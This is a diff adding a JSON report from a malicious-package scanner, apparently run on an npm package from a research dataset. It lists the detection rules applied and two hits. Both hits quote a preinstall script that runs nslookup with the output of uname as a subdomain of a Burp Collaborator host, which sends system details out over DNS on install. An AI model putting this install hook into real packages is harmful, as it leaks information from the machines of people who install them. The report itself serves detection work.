@@ -1,0 +1,28 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "npm-steganography": {},
+        "npm-exec-base64": {},
+        "npm-silent-process-execution": {},
+        "npm-exfiltrate-sensitive-data": {},
+        "npm-serialize-environment": {},
+        "npm-install-script": [
+            {
+                "location": "package/package.json:7",
+                "code": "    \"preinstall\":\"nslookup `uname`.evd05gbvzps2ax707db5im9mmds4lsa.burpcollaborator.net\",     \n",
+                "message": "The package.json has a script automatically running when the package is installed"
+            }
+        ],
+        "npm-obfuscation": {},
+        "shady-links": [
+            {
+                "location": "package/package.json:7",
+                "code": "    \"preinstall\":\"nslookup `uname`.evd05gbvzps2ax707db5im9mmds4lsa.burpcollaborator.net\",     \n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "npm-dll-hijacking": {}
+    },
+    "path": "./dataset/npm/internal_pkg_for_dc_new-1.0.5"
+}
